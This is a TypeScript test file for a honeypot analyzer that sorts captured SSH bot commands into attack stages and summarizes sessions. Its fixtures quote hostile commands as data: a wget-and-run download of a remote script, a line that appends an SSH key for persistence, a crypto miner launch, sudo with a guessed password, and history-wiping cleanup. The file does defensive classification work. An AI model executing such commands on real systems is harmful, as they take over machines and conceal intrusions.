import { describe, expect, it } from 'vitest';
import type { RadarEvento } from '@/services/radar';
import { duracaoTexto, etapaDoComando, resumirSessao } from './sessao';

// Comandos reais (resumidos) de bots que entraram no honeypot.
describe('etapaDoComando', () => {
  it('reconhecimento da máquina', () => {
    expect(etapaDoComando('uname -s -v -n -r -m')).toBe('reconhecimento');
    expect(etapaDoComando("uname -m | awk '{printf $1}'")).toBe('reconhecimento');
    expect(etapaDoComando('export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH')).toBe('reconhecimento');
    expect(etapaDoComando('uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null)')).toBe('reconhecimento');
    expect(etapaDoComando('whoami')).toBe('reconhecimento');
  });

  it('sudo com a senha recém-descoberta é tentativa de privilégio', () => {
    expect(etapaDoComando("echo '123456' | sudo -S sh -c 'nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null'")).toBe('credencial');
  });

  it('dar permissão e rodar o binário enviado é execução', () => {
    expect(etapaDoComando("echo '1234' | sudo -S sh -c 'chmod +x '\\''/root/.16'\\''' || chmod +x '/root/.16'")).toBe('execucao');
    expect(etapaDoComando("echo '1234' | sudo -S sh -c ''\\''/root/.16'\\''' || echo '1234' | sudo -S '/root/.16' || sh -c ''\\''/root/.16'\\''' || '/root/.16'")).toBe('execucao');
    expect(etapaDoComando('./xmr')).toBe('execucao');
    expect(etapaDoComando('nohup ./bot &')).toBe('execucao');
  });

  it('apagar o arquivo depois é limpeza, não execução', () => {
    expect(etapaDoComando("echo '1234' | sudo -S sh -c 'rm -rf '\\''/root/.16'\\''' || rm -rf '/root/.16'")).toBe('limpeza');
    expect(etapaDoComando('history -c')).toBe('limpeza');
  });

  it('download, persistência, mineração e teste anti-honeypot', () => {
    expect(etapaDoComando('cd /tmp; wget http://198.51.100.9/bins.sh; sh bins.sh')).toBe('download');
    expect(etapaDoComando('echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys')).toBe('persistencia');
    expect(etapaDoComando('./xmrig -o stratum+tcp://pool:3333')).toBe('mineracao');
    expect(etapaDoComando('echo $((7*6))')).toBe('evasao');
  });

  it('o que não reconhece fica como outro', () => {
    expect(etapaDoComando('fi')).toBe('outro');
    expect(etapaDoComando('done')).toBe('outro');
  });
});

const ev = (acao: string, seg: number, detalhes: Record<string, unknown> = {}, usuario: string | null = null): RadarEvento => ({
  id: `${acao}${seg}`, fonte: 'cowrie', ocorridoEm: new Date(Date.UTC(2026, 10, 14, 7, 0, seg)).toISOString(),
  ipOrigem: '198.51.100.7', paisOrigem: null, portaDestino: 22, servico: 'ssh', acao, usuarioTentado: usuario, alvo: 'hp', detalhes,
});

describe('resumirSessao', () => {
  it('conta logins, comandos, arquivos e etapas na ordem em que aparecem', () => {
    const r = resumirSessao([
      ev('comando', 20, { comando: "chmod +x /root/.16" }),
      ev('conexao', 0),
      ev('login_falha', 2, {}, 'admin'),
      ev('login_ok', 4, {}, 'root'),
      ev('comando', 6, { comando: 'uname -a' }),
      ev('download', 10, { url: '/root/.16', sha256: 'ab'.repeat(32) }),
      ev('tunel', 12, { destino: '1.1.1.1:443' }),
      ev('tunel', 13, { destino: '1.1.1.1:443' }),
      ev('comando', 30, { comando: 'rm -rf /root/.16' }),
    ]);
    expect(r.duracaoSeg).toBe(30);
    expect(r.tentativasLogin).toBe(2);
    expect(r.loginAceito?.usuario).toBe('root');
    expect(r.comandos).toBe(3);
    expect(r.arquivos).toHaveLength(1);
    expect(r.tuneis).toEqual(['1.1.1.1:443']);
    expect(r.etapas).toEqual(['reconhecimento', 'download', 'execucao', 'limpeza']);
  });

  it('sessão vazia', () => {
    const r = resumirSessao([]);
    expect(r.inicio).toBeNull();
    expect(r.duracaoSeg).toBe(0);
  });
});

describe('duracaoTexto', () => {
  it('formata segundos, minutos e horas', () => {
    expect(duracaoTexto(42)).toBe('42 s');
    expect(duracaoTexto(125)).toBe('2 min 5 s');
    expect(duracaoTexto(3720)).toBe('1 h 2 min');
  });
});
